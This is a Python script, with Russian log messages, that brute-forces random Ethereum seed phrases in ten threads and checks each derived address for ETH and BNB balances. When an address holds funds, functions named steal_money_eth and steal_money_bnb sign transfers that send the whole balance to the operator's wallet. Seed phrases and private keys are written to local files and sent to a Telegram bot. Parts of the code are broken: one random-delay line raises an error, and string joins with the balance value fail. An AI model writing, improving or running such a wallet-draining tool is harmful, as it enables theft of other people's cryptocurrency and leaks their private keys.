# -*- coding: utf-8 -*-
from cgitb import text
from threading import Thread
from web3 import Web3
from eth_account import Account
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
from hdwallet.derivations import BIP44Derivation
from hdwallet.utils import generate_mnemonic
from time import sleep
import logging
import config_gener as config
import random
import requests


threads = 10
url_eth = config.infura_eth
url_bnb = "https://bsc-dataseed.binance.org/"
w3_bnb = Web3(Web3.HTTPProvider(url_bnb))
w3_eth = Web3(Web3.HTTPProvider(url_eth))
logging.basicConfig(level=logging.INFO)
eth_balance = config.eth_balance
eth_gwei = config.eth_gwei
user_wallet_address = config.address
bnb_balance = config.bnb_balance
bnb_gwei = config.bnb_gwei


tg_token = config.tg_token
tg_id = config.tg_id


def check_balance(address, mnemonic, private_key):
    try:
        balance_eth_count = w3_eth.eth.getBalance(address)
        transaction_count_eth = w3_eth.eth.get_transaction_count(address)
        balance_bnb_count = w3_bnb.eth.getBalance(address)
        transaction_count_bnb = w3_bnb.eth.get_transaction_count(address)
        logging.info(
            f" ETH: {balance_eth_count} BNB: {balance_bnb_count} | {address} | {mnemonic} | Транзакции ETH: {transaction_count_eth} BNB: {transaction_count_bnb}"
        )
        random_time_stop = random.randrange(int("0,3"), int("0,2"), int("0,5"))

        sleep(random_time_stop)
        if balance_eth_count > 0:
            steal_money_eth(address, mnemonic, private_key, balance_eth_count)
        if balance_bnb_count > 0:
            steal_money_bnb(address, mnemonic, private_key, balance_bnb_count)
        if transaction_count_eth > 0:
            file_eth = open("trans_eth.txt", "a")
            file_eth.write(
                f"Адрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
            )

            text = f"Транзакция успешно записана в trans_eth.txt\nАдрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
            requests.get(
                f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
            )

            file_eth.close()
        if transaction_count_bnb > 0:
            file_bnb = open("trans_bnb.txt", "a")
            file_bnb.write(
                f"Адрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
            )

            text = f"Транзакция успешно записана в trans_bnb.txt\nАдрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
            requests.get(
                f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
            )

            file_bnb.close()
    except:
        pass


def ethereum_generate():
    while True:
        mnemonic = generate_mnemonic()
        bip44_hdwallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
        bip44_hdwallet.from_mnemonic(mnemonic, "english").clean_derivation()
        bip44_hdwallet.from_path(BIP44Derivation(EthereumMainnet)).clean_derivation()
        account = Account.from_key(f"0x{bip44_hdwallet.private_key()}")
        check_balance(
            account.address,
            bip44_hdwallet.mnemonic(),
            f"0x{bip44_hdwallet.private_key()}",
        )


def steal_money_bnb(address, mnemonic, private_key, balance_bnb_count):
    try:
        logging.info(
            f"Нашёл сидку: {mnemonic} с балансом: {balance_bnb_count} пробую вывести!"
        )

        text = (
            f"Нашёл сидку: {mnemonic} с балансом: {balance_bnb_count} пробую вывести!"
        )
        requests.get(
            f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
        )

        counter = 0
        while True:
            balance_unwei = w3_bnb.eth.get_balance(address)
            balance = w3_bnb.fromWei(balance_unwei, "ether")
            if int(balance) < int(bnb_balance):
                print(balance)
                counter = counter + 1
                sleep(0.1)
                if counter == 200:
                    print("Остановимся на этом")
                    return
            else:
                break
        nonce = w3_bnb.eth.get_transaction_count(address)
        tx_price = {
            "chainId": 56,
            "nonce": nonce,
            "to": user_wallet_address,
            "value": w3_bnb.toWei(balance, "ether"),
            "gas": 21000,
            "gasPrice": w3_bnb.toWei(bnb_gwei, "gwei"),
        }
        print(tx_price)
        signed_tx = w3_bnb.eth.account.sign_transaction(tx_price, private_key)
        tx_hash = w3_bnb.eth.send_raw_transaction(signed_tx.rawTransaction)
        amount_sent_eth = balance
        tx_link_eth = "https://bscscan.com/tx/" + tx_hash.rawTransaction
        print(f"BNB " + amount_sent_eth + "Чики пуки" + tx_link_eth)

        text = f"BNB " + amount_sent_eth + "Чики пуки" + tx_link_eth
        requests.get(
            f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
        )

    except:
        file_bnb_vivod = open("vivod_bnb.txt", "a")
        file_bnb_vivod.write(
            f"Адрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
        )
        file_bnb_vivod.close()


def steal_money_eth(address, mnemonic, private_key, balance_eth_count):
    try:
        logging.info(
            f" Нашёл сидку: {mnemonic} с балансом: {balance_eth_count} пробую вывести!"
        )

        text = (
            f" Нашёл сидку: {mnemonic} с балансом: {balance_eth_count} пробую вывести!"
        )
        requests.get(
            f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
        )

        counter = 0
        while True:
            balance_unwei = w3_eth.eth.get_balance(address)
            balance = w3_eth.fromWei(balance_unwei, "ether")
            if int(balance) < int(eth_balance):
                print(balance)
                counter = counter + 1
                sleep(0.1)
                if counter == 200:
                    print("Остановимся на этом")
                    return
            else:
                break
        nonce = w3_eth.eth.get_transaction_count(address)
        tx_price = {
            "chainId": 1,
            "nonce": nonce,
            "to": user_wallet_address,
            "value": w3_eth.toWei(balance, "ether"),
            "gas": 21000,
            "gasPrice": w3_eth.toWei(eth_gwei, "gwei"),
        }
        print(tx_price)
        signed_tx = w3_eth.eth.account.sign_transaction(tx_price, private_key)
        tx_hash = w3_eth.eth.send_raw_transaction(signed_tx.rawTransaction)
        amount_sent_eth = balance
        tx_link_eth = "https://etherscan.com/tx/" + tx_hash.rawTransaction
        print(f"ETH " + amount_sent_eth + "Чики пуки" + tx_link_eth)

        text = f"ETH " + amount_sent_eth + "Чики пуки" + tx_link_eth
        requests.get(
            f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
        )

    except:
        print(" Не получилось вывести eth сохраняю в файл")

        text = " Не получилось вывести eth сохраняю в файл"
        requests.get(
            f"https://api.telegram.org/bot{tg_token}/sendMessage?chat_id={tg_id}&text={text}"
        )

        file_eth_vivod = open("vivod_eth.txt", "a")
        file_eth_vivod.write(
            f"Адрес: {address} | Фраза: {mnemonic} | Ключ: {private_key}\n"
        )
        file_eth_vivod.close()


def start():
    if w3_eth.isConnected() == True:
        if w3_bnb.isConnected() == True:
            for _ in range(threads):
                Thread(target=ethereum_generate).start()
        else:
            print("Ссылка на бнб дед")
    else:
        print("Ссылка на инфуру дед")


start()
